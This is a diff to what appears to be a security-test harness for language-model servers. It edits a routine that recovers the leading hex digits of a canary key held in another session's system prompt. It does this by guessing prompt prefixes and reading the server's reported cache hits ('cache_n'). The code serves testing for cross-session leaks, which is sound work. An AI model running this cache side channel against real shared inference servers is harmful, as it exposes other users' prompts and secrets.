@@ -73,8 +73,8 @@ async def _cross_session(lab: Lab, report: Report, route: tuple[str, str | None]
 
 
 def _recover(route: tuple[str, str | None], system: str) -> tuple[str, float]:
-    """The leading hex digits of ``secret`` that a second session finds by watching how much of
-    each guessed prompt the server had cached from the first."""
+    """The leading hex digits that a second session guesses, by choosing at each position the
+    digit whose prompt the server had most of cached from the first session's."""
     started = time.monotonic()
     found = ""
     for _ in range(4):
@@ -83,10 +83,7 @@ def _recover(route: tuple[str, str | None], system: str) -> tuple[str, float]:
             ask(route, system, "hello", 0)
             guess = OPENING + "The deployment key is KEY-" + found + digit
             scores[digit] = ask(route, guess, "x", None)[1].get("cache_n", 0)
-        best = max(scores, key=lambda d: scores[d])
-        if sorted(scores.values())[-1] == sorted(scores.values())[-2]:
-            break
-        found += best
+        found += max(scores, key=lambda d: scores[d])
     return found, time.monotonic() - started
 
 
@@ -100,7 +97,7 @@ async def _cache_oracle(lab: Lab, report: Report, route: tuple[str, str | None],
                            detail="the server reports no cache use"))
         return
     found, seconds = await asyncio.to_thread(_recover, route, system)
-    right = canary.token.removeprefix("KEY-").startswith(found) and len(found) == 4
+    right = canary.token.removeprefix("KEY-").startswith(found)
     report.add(Attempt(TARGET, "prompt-cache-oracle", "cache_n-prefix", right, arm=arm,
                        seconds=seconds, detail=f"recovered {len(found)} of 4 leading digits "
                        f"({found!r}) of another session's key from cache_n"))
